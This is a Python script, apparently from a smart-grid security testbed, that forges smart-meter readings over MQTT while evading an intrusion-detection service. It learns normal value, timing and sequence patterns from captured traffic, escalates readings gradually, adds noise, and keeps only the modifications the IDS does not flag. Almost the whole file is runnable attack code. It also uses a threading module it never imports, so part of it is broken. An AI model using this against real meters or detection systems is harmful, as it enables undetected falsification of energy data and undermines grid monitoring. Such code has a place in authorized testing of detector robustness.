#!/usr/bin/env python3
"""
IDS Evasion Attacker - Learns IDS patterns and adapts to evade detection
"""

import os
import json
import time
import argparse
import random
import requests
import statistics
from typing import List, Dict, Any, Tuple
import paho.mqtt.client as mqtt

# Config
DEFAULT_BROKER = "localhost"
DEFAULT_PORT = 1883
DEFAULT_TOPIC = "grid/readings"
CAPTURE_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "data", "captures.json"))
IDS_URL = "http://127.0.0.1:5100/check"

class IDSEvasionAttacker:
    def __init__(self, broker=DEFAULT_BROKER, port=DEFAULT_PORT, topic=DEFAULT_TOPIC):
        self.broker = broker
        self.port = port
        self.topic = topic
        self.captures = self.load_captures()
        self.ids_profile = {}  # Learn IDS behavior patterns
        self.meter_profiles = {}  # Track meter behavior patterns
        
    def load_captures(self) -> List[Dict[str, Any]]:
        if not os.path.exists(CAPTURE_FILE):
            return []
        with open(CAPTURE_FILE, "r") as f:
            return json.load(f)
    
    def probe_ids(self, payload: dict) -> Dict[str, Any]:
        """Probe IDS to understand its detection patterns"""
        try:
            response = requests.post(IDS_URL, json={"reading": payload, "last_seq": 0}, timeout=2)
            if response.status_code == 200:
                return response.json()
            else:
                return {"suspicious": False, "score": 0.0, "reasons": ["ids_error"]}
        except Exception as e:
            print(f"[IDS_EVASION] IDS probe failed: {e}")
            return {"suspicious": False, "score": 0.0, "reasons": ["ids_unavailable"]}
    
    def learn_meter_patterns(self, meter_id: str) -> Dict[str, Any]:
        """Learn normal patterns for a specific meter"""
        meter_captures = [c for c in self.captures if c["payload"].get("meterID") == meter_id]
        
        if len(meter_captures) < 5:
            return {"values": [], "timestamps": [], "sequences": []}
        
        values = [c["payload"].get("value", 0) for c in meter_captures]
        timestamps = [c["payload"].get("ts", 0) for c in meter_captures]
        sequences = [c["payload"].get("seq", 0) for c in meter_captures]
        
        pattern = {
            "values": {
                "mean": statistics.mean(values),
                "std": statistics.stdev(values) if len(values) > 1 else 0,
                "min": min(values),
                "max": max(values),
                "range": max(values) - min(values)
            },
            "timestamps": {
                "intervals": [timestamps[i+1] - timestamps[i] for i in range(len(timestamps)-1)],
                "mean_interval": statistics.mean([timestamps[i+1] - timestamps[i] for i in range(len(timestamps)-1)]) if len(timestamps) > 1 else 0
            },
            "sequences": {
                "gaps": [sequences[i+1] - sequences[i] for i in range(len(sequences)-1)],
                "mean_gap": statistics.mean([sequences[i+1] - sequences[i] for i in range(len(sequences)-1)]) if len(sequences) > 1 else 0
            }
        }
        
        return pattern
    
    def adaptive_value_attack(self, payload: dict, meter_id: str):
        """Adaptively modify values to stay within normal ranges"""
        if meter_id not in self.meter_profiles:
            self.meter_profiles[meter_id] = self.learn_meter_patterns(meter_id)
        
        pattern = self.meter_profiles[meter_id]
        if not pattern.get("values"):
            return payload
        
        # Stay within 1 standard deviation of normal
        normal_mean = pattern["values"]["mean"]
        normal_std = pattern["values"]["std"]
        
        # Generate value within normal range
        target_value = random.uniform(normal_mean - normal_std, normal_mean + normal_std)
        payload["value"] = round(target_value, 2)
        
        return payload
    
    def timing_evasion_attack(self, payload: dict, meter_id: str):
        """Evade timing-based detection"""
        if meter_id not in self.meter_profiles:
            self.meter_profiles[meter_id] = self.learn_meter_patterns(meter_id)
        
        pattern = self.meter_profiles[meter_id]
        if not pattern.get("timestamps"):
            return payload
        
        # Use normal timing intervals
        mean_interval = pattern["timestamps"]["mean_interval"]
        if mean_interval > 0:
            # Wait for normal interval before sending
            time.sleep(min(mean_interval, 5))  # Cap at 5 seconds
        
        payload["ts"] = int(time.time())
        return payload
    
    def sequence_evasion_attack(self, payload: dict, meter_id: str):
        """Evade sequence-based detection"""
        if meter_id not in self.meter_profiles:
            self.meter_profiles[meter_id] = self.learn_meter_patterns(meter_id)
        
        pattern = self.meter_profiles[meter_id]
        if not pattern.get("sequences"):
            return payload
        
        # Use normal sequence gaps
        mean_gap = pattern["sequences"]["mean_gap"]
        if mean_gap > 0:
            # Use normal gap size
            payload["seq"] = payload.get("seq", 0) + int(mean_gap)
        
        return payload
    
    def gradual_escalation_attack(self, payload: dict, steps: int = 5):
        """Gradually escalate values to avoid sudden change detection"""
        original_value = payload.get("value", 0)
        target_value = original_value * 2  # Double the value
        
        step_size = (target_value - original_value) / steps
        
        for i in range(steps):
            modified_payload = payload.copy()
            modified_payload["value"] = round(original_value + (step_size * i), 2)
            modified_payload["seq"] = payload.get("seq", 0) + i
            modified_payload["ts"] = int(time.time()) + i
            
            # Test if IDS detects this step
            ids_result = self.probe_ids(modified_payload)
            if ids_result.get("suspicious", False):
                print(f"[IDS_EVASION] Detected at step {i}, stopping escalation")
                break
            
            self.publish_attack(modified_payload)
            time.sleep(1)
    
    def noise_injection_attack(self, payload: dict, noise_level: float = 0.1):
        """Add controlled noise to evade pattern detection"""
        original_value = payload.get("value", 0)
        
        # Add small random noise
        noise = random.uniform(-noise_level, noise_level)
        payload["value"] = round(original_value + noise, 2)
        
        return payload
    
    def multi_meter_coordination_attack(self, payloads: List[dict]):
        """Coordinate attacks across multiple meters to evade detection"""
        # Send attacks in coordinated bursts
        burst_size = 3
        burst_delay = 2
        
        for i in range(0, len(payloads), burst_size):
            burst = payloads[i:i+burst_size]
            
            # Send burst simultaneously
            threads = []
            for payload in burst:
                thread = threading.Thread(target=self.publish_attack, args=(payload,))
                threads.append(thread)
                thread.start()
            
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
            
            # Wait before next burst
            time.sleep(burst_delay)
    
    def adversarial_example_attack(self, payload: dict):
        """Generate adversarial examples to fool IDS"""
        # Try different modifications to find ones that evade detection
        modifications = [
            lambda p: {**p, "value": p.get("value", 0) * 0.99},  # Slight decrease
            lambda p: {**p, "value": p.get("value", 0) * 1.01},  # Slight increase
            lambda p: {**p, "ts": p.get("ts", 0) + 1},  # Slight timestamp change
            lambda p: {**p, "seq": p.get("seq", 0) + 1},  # Slight sequence change
        ]
        
        for mod_func in modifications:
            modified_payload = mod_func(payload.copy())
            ids_result = self.probe_ids(modified_payload)
            
            if not ids_result.get("suspicious", False):
                print(f"[IDS_EVASION] Found evasive modification: {ids_result}")
                self.publish_attack(modified_payload)
                return modified_payload
        
        return payload
    
    def publish_attack(self, payload: dict, target_topic: str = None):
        """Publish the attack payload"""
        client = mqtt.Client(client_id=f"ids_evasion_{int(time.time()*1000)}")
        client.connect(self.broker, self.port, 60)
        client.loop_start()
        
        topic = target_topic or self.topic
        payload_str = json.dumps(payload, separators=(",", ":"), sort_keys=False)
        client.publish(topic, payload_str)
        
        time.sleep(0.2)
        client.loop_stop()
        client.disconnect()
        
        print(f"[IDS_EVASION] Published: meter={payload.get('meterID')} value={payload.get('value')} score={self.probe_ids(payload).get('score', 0)}")
    
    def run_evasion_attacks(self, attack_type: str = "all", target_meter: str = None):
        """Run various IDS evasion attacks"""
        if not self.captures:
            print("No captures available for evasion attacks")
            return
        
        # Filter captures by meter if specified
        target_captures = self.captures
        if target_meter:
            target_captures = [c for c in self.captures if c["payload"].get("meterID") == target_meter]
        
        if not target_captures:
            print(f"No captures found for meter {target_meter}")
            return
        
        target_capture = random.choice(target_captures)
        original_payload = target_capture["payload"].copy()
        meter_id = original_payload.get("meterID")
        
        attacks = {
            "adaptive_value": lambda p: self.adaptive_value_attack(p, meter_id),
            "timing_evasion": lambda p: self.timing_evasion_attack(p, meter_id),
            "sequence_evasion": lambda p: self.sequence_evasion_attack(p, meter_id),
            "gradual_escalation": lambda p: self.gradual_escalation_attack(p, 5),
            "noise_injection": lambda p: self.noise_injection_attack(p, 0.1),
            "adversarial": self.adversarial_example_attack,
        }
        
        if attack_type == "all":
            for attack_name, attack_func in attacks.items():
                print(f"[IDS_EVASION] Running {attack_name} attack...")
                if attack_name == "gradual_escalation":
                    attack_func(original_payload.copy())
                else:
                    modified_payload = attack_func(original_payload.copy())
                    self.publish_attack(modified_payload)
                time.sleep(2)
        elif attack_type in attacks:
            print(f"[IDS_EVASION] Running {attack_type} attack...")
            if attack_type == "gradual_escalation":
                attacks[attack_type](original_payload.copy())
            else:
                modified_payload = attacks[attack_type](original_payload.copy())
                self.publish_attack(modified_payload)

def main():
    parser = argparse.ArgumentParser(description="IDS Evasion Attacker")
    parser.add_argument("--broker", default=DEFAULT_BROKER)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--topic", default=DEFAULT_TOPIC)
    parser.add_argument("--attack", choices=["adaptive_value", "timing_evasion", "sequence_evasion", 
                                            "gradual_escalation", "noise_injection", "adversarial", "all"], 
                       default="all", help="Type of IDS evasion attack")
    parser.add_argument("--target-meter", help="Target meter ID for attacks")
    parser.add_argument("--confirm", action="store_true", help="Required to execute attacks")
    
    args = parser.parse_args()
    
    if not args.confirm:
        print("IDS evasion attacks require --confirm")
        return
    
    attacker = IDSEvasionAttacker(args.broker, args.port, args.topic)
    attacker.run_evasion_attacks(args.attack, args.target_meter)

if __name__ == "__main__":
    main()